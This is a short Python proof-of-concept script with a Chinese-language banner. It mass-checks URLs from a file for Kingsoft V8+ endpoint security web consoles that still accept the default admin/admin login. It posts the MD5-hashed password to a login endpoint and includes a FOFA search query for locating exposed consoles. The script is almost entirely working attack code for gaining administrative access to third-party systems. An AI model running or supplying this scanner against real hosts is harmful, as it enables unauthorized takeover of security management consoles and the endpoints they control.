import requests
import sys
import random
import re
import base64
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
        print('+------------------------------------------')
        print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
        print('+  \033[31mVersion: 金山v8弱口令检测                                            \033[0m')
        print('+  \033[31m使用格式:  python3 poc.py                                           \033[0m')
        print('+  \033[31mVersion: fofa：title="在线安装-V8+终端安全系统Web控制台"                \033[0m')
        print('+  \033[31mUrl      >>> http://xxx.xxx.xxx.xxx                                \033[0m')
        print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/inter/ajax.php?cmd=get_user_login_cmd"
    data = json.dumps({"get_user_login_cmd": {"name": "admin", "password": "21232f297a57a5a743894a0e4a801fc3"}})
    try:
        response = requests.post(url=vuln_url, data=data, verify=False, timeout=5)
        if "userSession" in response.text and response.status_code == 200:
            print('\033[31m-\033[0m' * 50)
            print(target_url,'\033[36m默认账号密码为admin/admin \033[0m' )
            print("\n")
            print('\033[31m-\033[0m' * 50)
        else:
            print('\033[31m-\033[0m'* 50)
            print(target_url,'\033[31m 漏洞不存在\033[0m')
            print('\033[31m-\033[0m' * 50)
            print("\n")
    except:
        print('\033[31m-\033[0m' * 50)
        print(target_url,'\033[31m 请求不存在 \033[0m')
        print("\n")

if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = i
            POC_1(target_url)
